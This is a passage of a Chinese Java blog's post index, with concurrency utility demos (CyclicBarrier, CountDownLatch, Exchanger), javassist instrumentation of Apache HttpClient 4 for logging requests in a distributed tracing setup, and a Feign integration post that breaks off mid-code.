class_\">CyclicBarrierDemo</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">CyclicBarrier</span> <span class=\"variable\">cyclicBarrier</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">CyclicBarrier</span>(<span class=\"number\">5</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        Thread[] threads = <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>[<span class=\"number\">5</span>];</span><br><span class=\"line\">        IntStream.range(<span class=\"number\">0</span>, <span class=\"number\">5</span>).forEach((i) -&gt; &#123;</span><br><span class=\"line\">            threads[i] = <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt; &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    method1();</span><br><span class=\"line\">                    System.out.printf(<span class=\"string\">&quot;%s：执行完毕，进入等待状态，当前等待线程数：%d \\n&quot;</span>, Thread.currentThread().getName(), cyclicBarrier.getNumberWaiting());</span><br><span class=\"line\">                    cyclicBarrier.await();</span><br><span class=\"line\">                    method2();</span><br><span class=\"line\">                    System.out.printf(<span class=\"string\">&quot;%s：执行完毕，进入等待状态，当前等待线程数：%d \\n&quot;</span>, Thread.currentThread().getName(), cyclicBarrier.getNumberWaiting());</span><br><span class=\"line\">                    cyclicBarrier.await();</span><br><span class=\"line\">                    method3();</span><br><span class=\"line\">                    System.out.printf(<span class=\"string\">&quot;%s：执行完毕，进入等待状态，当前等待线程数：%d \\n&quot;</span>, Thread.currentThread().getName(), cyclicBarrier.getNumberWaiting());</span><br><span class=\"line\">                    cyclicBarrier.await();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException | BrokenBarrierException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Thread thread : threads) &#123;</span><br><span class=\"line\">            thread.start();</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                TimeUnit.MILLISECONDS.sleep(<span class=\"number\">300</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">method1</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;%s 执行步骤1\\n&quot;</span>, Thread.currentThread().getName());</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            TimeUnit.SECONDS.sleep(<span class=\"keyword\">new</span> <span class=\"title class_\">Random</span>().nextInt(<span class=\"number\">3</span>));</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">method2</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;%s 执行步骤2\\n&quot;</span>, Thread.currentThread().getName());</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            TimeUnit.SECONDS.sleep(<span class=\"keyword\">new</span> <span class=\"title class_\">Random</span>().nextInt(<span class=\"number\">3</span>));</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">method3</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;%s 执行步骤3\\n&quot;</span>, Thread.currentThread().getName());</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            TimeUnit.SECONDS.sleep(<span class=\"keyword\">new</span> <span class=\"title class_\">Random</span>().nextInt(<span class=\"number\">3</span>));</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>CyclicBarrier在执行完毕后，可以重复使用，在使用CyclicBarrier时需要注意，执行的线数量需要大于等于设定的数量，不然会导致线程一直进入等待状态</p>\n<h3 id=\"CountDownLatch\"><a href=\"#CountDownLatch\" class=\"headerlink\" title=\"CountDownLatch\"></a>CountDownLatch</h3><p>CountDownLatch，允许一个或多个线程一直等待，直到其他线程的操作执行完后再执行。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CountDownLatchDemo</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">CountDownLatch</span> <span class=\"variable\">countDownLatch</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">CountDownLatch</span>(<span class=\"number\">3</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(()-&gt;&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;等待线程执行完毕...&quot;</span>);</span><br><span class=\"line\">                countDownLatch.await();</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;完成。&quot;</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;).start();</span><br><span class=\"line\"></span><br><span class=\"line\">        TimeUnit.SECONDS.sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">        IntStream.range(<span class=\"number\">0</span>, <span class=\"number\">3</span>).forEach((i) -&gt; <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(()-&gt;&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                System.out.printf(<span class=\"string\">&quot;%s：线程开始执行\\n&quot;</span>, Thread.currentThread().getName());</span><br><span class=\"line\">                TimeUnit.SECONDS.sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">                System.out.printf(<span class=\"string\">&quot;%s：线程执行完毕\\n&quot;</span>, Thread.currentThread().getName());</span><br><span class=\"line\">                countDownLatch.countDown();</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;).start());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在使用CountDownLatch时需要注意的是，CountDownLatch只能使用一次，使用之后CountDownLatch会失效。<br>CountDownLatch与CyclicBarrier区别在于，CyclicBarrier是一组线程互相等待直到都完成后，才继续后续步骤，而且CyclicBarrier是可以重用的。CountDownLatch是一个线程等待其他线程，直达到达指定值才开始执行，且不可重用。</p>\n<h3 id=\"Exchanger\"><a href=\"#Exchanger\" class=\"headerlink\" title=\"Exchanger\"></a>Exchanger</h3><p>Exchanger允许两个线程到达共同设置的点时，交换数据。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ExchangerDemo</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> Exchanger&lt;Integer&gt; exchanger = <span class=\"keyword\">new</span> <span class=\"title class_\">Exchanger</span>&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt; &#123;</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">num</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                    System.out.printf(<span class=\"string\">&quot;%s：线程内部值为：%d \\n&quot;</span>, Thread.currentThread().getName(), num);</span><br><span class=\"line\">                    TimeUnit.SECONDS.sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">                    num = exchanger.exchange(num);</span><br><span class=\"line\">                    System.out.printf(<span class=\"string\">&quot;%s：交换后线程内部值为：%d \\n&quot;</span>, Thread.currentThread().getName(), num);</span><br><span class=\"line\">                    TimeUnit.SECONDS.sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt; &#123;</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">num</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                    System.out.printf(<span class=\"string\">&quot;%s：线程内部值为：%d \\n&quot;</span>, Thread.currentThread().getName(), num);</span><br><span class=\"line\">                    TimeUnit.SECONDS.sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">                    num = exchanger.exchange(num);</span><br><span class=\"line\">                    System.out.printf(<span class=\"string\">&quot;%s：交换后线程内部值为：%d \\n&quot;</span>, Thread.currentThread().getName(), num);</span><br><span class=\"line\">                    TimeUnit.SECONDS.sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","tags":["并发同步","工具类"]},{"title":"httpclient4请求拦截","url":"/2018/02/08/httpclient4%E8%AF%B7%E6%B1%82%E6%8B%A6%E6%88%AA/","content":"<p>最近在准备写一个分布式调用链记录，记录用请求开始到请求各个系统直到结束。不同系统间调用方式不一样，现在第一步先拦截http请求，获取请求参数以及返回值，并做日志记录。<br>使用http请求中，可能使用了各种框架，暂时先处理Apache httpclient。</p>\n<span id=\"more\"></span>\n<h3 id=\"拦截HttpRequestExecutor\"><a href=\"#拦截HttpRequestExecutor\" class=\"headerlink\" title=\"拦截HttpRequestExecutor\"></a>拦截HttpRequestExecutor</h3><p>在使用httpclient时，最终都会调用到HttpRequestExecutor.execute提交请求，可以对execute进行拦截处理，在execute方法前后插入获取请求和返回值。</p>\n<p>1、在启动加载HttpRequestExecutor时，通过javassist修改class<br>2、在方法前后插入指定方法<br>3、方法前获取请求数据URL等，header中插入traceId标示<br>4、方法后插入获取返回值</p>\n<p>因为execute中存在参数HttpRequest，所以设置头部信息比较方便，但是如果想获取请求参数比较麻烦。</p>\n<h3 id=\"DefaultBHttpClientConnection修改\"><a href=\"#DefaultBHttpClientConnection修改\" class=\"headerlink\" title=\"DefaultBHttpClientConnection修改\"></a>DefaultBHttpClientConnection修改</h3><p>在execute中获取请求参数需要强制转换对象为子类，可能出现未知的子类。所以通过修改DefaultBHttpClientConnection的class在sendRequestEntity前插入一段代码，用于获取请求参数。<br>例子如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">sendRequestEntity</span><span class=\"params\">(Object target, Object[] args)</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">HttpEntityEnclosingRequest</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> (HttpEntityEnclosingRequest)args[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"type\">HttpEntity</span> <span class=\"variable\">entity</span> <span class=\"operator\">=</span> request.getEntity();</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (entity != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"type\">InputStream</span> <span class=\"variable\">content</span> <span class=\"operator\">=</span> entity.getContent();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (content.markSupported())&#123;</span><br><span class=\"line\">                <span class=\"type\">int</span> <span class=\"variable\">contentLength</span> <span class=\"operator\">=</span> (<span class=\"type\">int</span>) entity.getContentLength();</span><br><span class=\"line\">                <span class=\"keyword\">final</span> <span class=\"type\">ByteArrayBuffer</span> <span class=\"variable\">buffer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ByteArrayBuffer</span>(contentLength);</span><br><span class=\"line\"><span class=\"comment\">//                    content.mark(contentLength);</span></span><br><span class=\"line\">                content.read(buffer.buffer(), <span class=\"number\">0</span>, contentLength);</span><br><span class=\"line\"><span class=\"comment\">//                    content.reset();</span></span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;~~~~~~~~~~~~~~~~&quot;</span>);</span><br><span class=\"line\">                System.out.println(<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(buffer.buffer()));</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;~~~~~~~~~~~~~~~~&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在例子中，因为该请求中使用的是ByteArrayInputStream，所以可以直接读取流中的数据，而不影响数据的发送。<br>这里可能存在一个问题，如果请求中保存的流不是ByteArrayInputStream，可能是其他的，就需要mark后reset，这种对于不支持mark的流就需要使用额外的处理方式了。<br>终极办法是，通过修改sendRequestEntity中prepareOutput方法的调用，在返回的OutputStream中对该流进行封装（装饰设计模式），定义一个OutputStreamWrapper，重写write方法，在write时，保存字节到数组中，同时写入流中。在之后可以通过读取字节中的数据，而不用担心出现之前的那种情况。</p>\n<h3 id=\"BHttpConnectionBase修改\"><a href=\"#BHttpConnectionBase修改\" class=\"headerlink\" title=\"BHttpConnectionBase修改\"></a>BHttpConnectionBase修改</h3><p>因为需要获取返回值，在第一步骤中execute是可以获取返回的HttpResponse，但是在读取HttpResponse中的数据后，使最终调用改接口的地方无法获取返回值，因为在返回的事InputStream中，只能读取一次，拦截时获取了返回值，就会导致实际调用方无法获取返回值。<br>这时就需要修改BHttpConnectionBase中prepareInput方法调用createInputStream时，返回的是一个支持重复读的流。修改如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">CtMethod</span> <span class=\"variable\">prepareInput</span> <span class=\"operator\">=</span> ctClass.getDeclaredMethod(<span class=\"string\">&quot;prepareInput&quot;</span>);</span><br><span class=\"line\">prepareInput.instrument(<span class=\"keyword\">new</span> <span class=\"title class_\">ExprEditor</span>() &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">edit</span><span class=\"params\">(MethodCall m)</span> <span class=\"keyword\">throws</span> CannotCompileException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"string\">&quot;createInputStream&quot;</span>.equals(m.getMethodName())) &#123;</span><br><span class=\"line\">            m.replace(<span class=\"string\">&quot;&#123;$_ = new java.io.BufferedInputStream($proceed($$));&#125;&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>通过获取prepareInput，之后修改createInputStream，包装返回的BufferedInputStream，在之后execute中获取返回值时，通过mark、reset来读取流，同时解决了IO无法重复读的问题。</p>\n","categories":["分布式调用链"],"tags":["Apache httpclient4","调用链"]},{"title":"Spring项目中集成feign","url":"/2018/02/22/Spring%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%9B%86%E6%88%90feign/","content":"<p>在平常项目中使用远程请求时，一般只自己手动封装Apache http请求，使用时可能有时候不够直观，现在尝试集成feign。</p>\n<span id=\"more\"></span>\n<p>添加feign依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--核心包--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>io.github.openfeign<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>feign-core<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>$&#123;feign.version&#125;<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--处理json--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>io.github.openfeign<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>feign-gson<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>$&#123;feign.version&#125;<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">exclusions</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">exclusion</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>gson<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.google.code.gson<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">exclusion</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">exclusions</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--打印日志，方便调试--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>io.github.openfeign<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>feign-slf4j<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>$&#123;feign.version&#125;<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">exclusions</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">exclusion</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>slf4j-api<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.slf4j<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">exclusion</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">exclusions</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--用于form请求时封装--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>io.github.openfeign.form<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>feign-form<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>$&#123;feign.form.version&#125;<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--用于spring form--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>io.github.openfeign.form<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>feign-form-spring<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>$&#123;feign.form.version&#125;<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">exclusions</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">exclusion</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-web<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">exclusion</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">exclusions</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--集成使用Apache http--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>io.github.openfeign<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>feign-httpclient<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>$&#123;feign.version&#125;<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>在现在有个接口中请求参数格式为data&#x3D;{}&#x2F;&#x2F;json，返回的格式为json格式<br>新建接口如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">AuthCall</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@RequestLine(&quot;POST /openapi/query.do&quot;)</span></span><br><span class=\"line\">    <span class=\"meta\">@Headers(&quot;Content-Type: application/x-www-form-urlencoded&quot;)</span></span><br><span class=\"line\">    QueryStoreAndAreaResultVo <span class=\"title function_\">queryMappingStoreAndArea</span><span class=\"params\">(<span class=\"meta\">@Param(value = &quot;data&quot;)</span>QueryStoreAndAreaParamsVo paramsVo)</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在使用feign时，默认会对请求数据进行序列化为json，因为为了满足自己项目需求，需要自己封装请求的序列化，以及返回参数的反序列化。如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//序列化请求参数</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">FNDataRawEncode</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Encoder</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">encode</span><span class=\"params\">(Object o, Type type, RequestTemplate requestTemplate)</span> <span class=\"keyword\">throws</span> EncodeException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (o <span class=\"keyword\">instanceof</span> Map) &#123;</span><br><span class=\"line\">            Map&lt;String, Object&gt; objectMap = (Map&lt;String, Object&gt;) o;</span><br><span class=\"line\">            <span class=\"type\">StringBuilder</span> <span class=\"variable\">sb</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>();</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> objectMap.size();</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (Map.Entry&lt;String, Object&gt; entry : objectMap.entrySet()) &#123;</span><br><span class=\"line\">                i--;</span><br><span class=\"line\">                sb.append(entry.getKey()).append(<span class=\"string\">&quot;=&quot;</span>).append(GsonUtils.toJson(entry.getValue()));</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (i != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                    sb.append(<span class=\"string\">&quot;&amp;&quot;</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            requestTemplate.body(sb.toString());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//反序列化返回的json</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">FNDataRawDecoder</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">GsonDecoder</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Object <span class=\"title function_\">decode</span><span class=\"params\">(Response response, Type type)</span> <span class=\"keyword\">throws</span> IOException, FeignException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (response.status() != <span class=\"number\">200</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> Util.emptyValueOf(type);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Response.<span class=\"type\">Body</span> <span class=\"variable\">body</span> <span class=\"operator\">=</span> response.body();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> 